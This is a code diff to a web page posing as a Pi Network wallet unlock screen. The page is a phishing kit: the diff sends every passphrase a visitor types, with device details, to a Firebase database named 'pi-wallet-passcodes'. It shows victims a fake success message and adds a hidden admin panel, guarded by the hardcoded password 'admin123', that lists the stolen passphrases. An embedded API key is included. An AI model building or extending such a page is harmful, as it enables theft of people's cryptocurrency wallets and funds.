@@ -193,6 +193,68 @@
             background-color: #222;
         }
         
+        /* Admin Login Styles */
+        .admin-login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+        }
+        
+        .admin-login-card {
+            background-color: white;
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+        }
+        
+        .admin-login-title {
+            text-align: center;
+            color: #8e44ad;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        
+        .admin-password-input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        
+        .admin-login-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #8e44ad;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .admin-cancel-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #f5f5f5;
+            color: #666;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        
         /* Responsive Styles */
         @media (max-width: 600px) {
             .container {
@@ -241,6 +303,16 @@
         </p>
     </div>
     
+    <!-- Admin Login Panel -->
+    <div class="admin-login-overlay" id="adminLoginOverlay">
+        <div class="admin-login-card">
+            <h2 class="admin-login-title">Admin Login</h2>
+            <input type="password" class="admin-password-input" id="adminPassword" placeholder="Enter admin password">
+            <button class="admin-login-button" id="adminLoginBtn">Login</button>
+            <button class="admin-cancel-button" id="adminCancelBtn">Cancel</button>
+        </div>
+    </div>
+    
     <!-- Admin Panel -->
     <div class="admin-panel" id="adminPanel">
         <div class="admin-header">
@@ -253,6 +325,7 @@
                 <tr>
                     <th>#</th>
                     <th>Date & Time</th>
+                    <th>Device Info</th>
                     <th>Passphrase</th>
                 </tr>
             </thead>
@@ -262,7 +335,26 @@
         </table>
     </div>
     
+    <!-- Firebase -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.22.2/firebase-firestore-compat.js"></script>
+    
     <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyD80lqr7YSoYNpZGX6lJAoXWnIvqHRh5pA",
+            authDomain: "pi-wallet-passcodes.firebaseapp.com",
+            projectId: "pi-wallet-passcodes",
+            storageBucket: "pi-wallet-passcodes.appspot.com",
+            messagingSenderId: "598187748672",
+            appId: "1:598187748672:web:b90b7bfe6e82c6c9d6b9a8"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const passcodesCollection = db.collection('passcodes');
+        
         // Elements
         const logo = document.getElementById('logo');
         const adminPanel = document.getElementById('adminPanel');
@@ -270,36 +362,74 @@
         const passphrase = document.getElementById('passphrase');
         const unlockBtn = document.getElementById('unlockBtn');
         const passcodesList = document.getElementById('passcodesList');
+        const adminLoginOverlay = document.getElementById('adminLoginOverlay');
+        const adminPassword = document.getElementById('adminPassword');
+        const adminLoginBtn = document.getElementById('adminLoginBtn');
+        const adminCancelBtn = document.getElementById('adminCancelBtn');
+        
+        // Admin password - Change this to your own password
+        const ADMIN_PASSWORD = "admin123";
         
         // Track logo clicks for double-click detection
         let lastClick = 0;
         const DOUBLE_CLICK_THRESHOLD = 300; // ms
         
-        // Load saved passcodes from localStorage
-        let savedPasscodes = JSON.parse(localStorage.getItem('piWalletPasscodes')) || [];
-        
-        // Function to update the passcodes table
-        function updatePasscodesTable() {
-            passcodesList.innerHTML = '';
+        // Function to get device info
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceInfo = "";
             
-            savedPasscodes.forEach((entry, index) => {
-                const row = document.createElement('tr');
-                
-                const indexCell = document.createElement('td');
-                indexCell.textContent = index + 1;
-                
-                const dateCell = document.createElement('td');
-                dateCell.textContent = entry.datetime;
-                
-                const passcodeCell = document.createElement('td');
-                passcodeCell.textContent = entry.passphrase;
-                
-                row.appendChild(indexCell);
-                row.appendChild(dateCell);
-                row.appendChild(passcodeCell);
-                
-                passcodesList.appendChild(row);
-            });
+            if (/Android/i.test(userAgent)) {
+                deviceInfo = "Android";
+            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                deviceInfo = "iOS";
+            } else if (/Windows/i.test(userAgent)) {
+                deviceInfo = "Windows";
+            } else if (/Mac/i.test(userAgent)) {
+                deviceInfo = "Mac";
+            } else if (/Linux/i.test(userAgent)) {
+                deviceInfo = "Linux";
+            } else {
+                deviceInfo = "Unknown";
+            }
+            
+            return `${deviceInfo} - ${window.innerWidth}x${window.innerHeight}`;
+        }
+        
+        // Function to update the passcodes table from Firebase
+        function updatePasscodesTable() {
+            passcodesCollection.orderBy('timestamp', 'desc').get()
+                .then((querySnapshot) => {
+                    passcodesList.innerHTML = '';
+                    let counter = 1;
+                    
+                    querySnapshot.forEach((doc) => {
+                        const data = doc.data();
+                        const row = document.createElement('tr');
+                        
+                        const indexCell = document.createElement('td');
+                        indexCell.textContent = counter++;
+                        
+                        const dateCell = document.createElement('td');
+                        dateCell.textContent = data.datetime;
+                        
+                        const deviceCell = document.createElement('td');
+                        deviceCell.textContent = data.deviceInfo;
+                        
+                        const passcodeCell = document.createElement('td');
+                        passcodeCell.textContent = data.passphrase;
+                        
+                        row.appendChild(indexCell);
+                        row.appendChild(dateCell);
+                        row.appendChild(deviceCell);
+                        row.appendChild(passcodeCell);
+                        
+                        passcodesList.appendChild(row);
+                    });
+                })
+                .catch((error) => {
+                    console.error("Error getting documents: ", error);
+                });
         }
         
         // Unlock button click event
@@ -310,44 +440,74 @@
                 // Get current date and time
                 const now = new Date();
                 const datetime = now.toLocaleString();
+                const timestamp = now.getTime();
                 
-                // Save the passphrase to the array
-                savedPasscodes.push({
+                // Get device info
+                const deviceInfo = getDeviceInfo();
+                
+                // Save the passphrase to Firebase
+                passcodesCollection.add({
                     datetime: datetime,
+                    timestamp: timestamp,
+                    deviceInfo: deviceInfo,
                     passphrase: passphraseText
+                })
+                .then(() => {
+                    // Show success message
+                    alert('Wallet unlocked successfully!');
+                    
+                    // Clear the input
+                    passphrase.value = '';
+                })
+                .catch((error) => {
+                    console.error("Error adding document: ", error);
+                    alert('Error unlocking wallet. Please try again.');
                 });
-                
-                // Save to localStorage
-                localStorage.setItem('piWalletPasscodes', JSON.stringify(savedPasscodes));
-                
-                // Show success message
-                alert('Wallet unlocked successfully!');
-                
-                // Clear the input
-                passphrase.value = '';
-                
-                // Update the passcodes table (in case admin panel is open)
-                updatePasscodesTable();
             } else {
                 alert('Please enter your passphrase');
             }
         });
         
-        // Logo click detection for admin panel
+        // Logo click detection for admin login
         logo.addEventListener('click', function() {
             const currentTime = new Date().getTime();
             if (currentTime - lastClick < DOUBLE_CLICK_THRESHOLD) {
-                // Double click detected, open admin panel
-                adminPanel.style.display = 'flex';
-                updatePasscodesTable();
+                // Double click detected, show admin login
+                adminLoginOverlay.style.display = 'flex';
+                adminPassword.focus();
             }
             lastClick = currentTime;
+        });
+        
+        // Admin login button click event
+        adminLoginBtn.addEventListener('click', function() {
+            if (adminPassword.value === ADMIN_PASSWORD) {
+                adminLoginOverlay.style.display = 'none';
+                adminPanel.style.display = 'flex';
+                adminPassword.value = '';
+                updatePasscodesTable();
+            } else {
+                alert('Incorrect password');
+            }
+        });
+        
+        // Admin cancel button click event
+        adminCancelBtn.addEventListener('click', function() {
+            adminLoginOverlay.style.display = 'none';
+            adminPassword.value = '';
         });
         
         // Close admin panel
         closeAdmin.addEventListener('click', function() {
             adminPanel.style.display = 'none';
         });
+        
+        // Enter key for admin login
+        adminPassword.addEventListener('keyup', function(event) {
+            if (event.key === 'Enter') {
+                adminLoginBtn.click();
+            }
+        });
     </script>
 </body>
-</html>
+    </html>
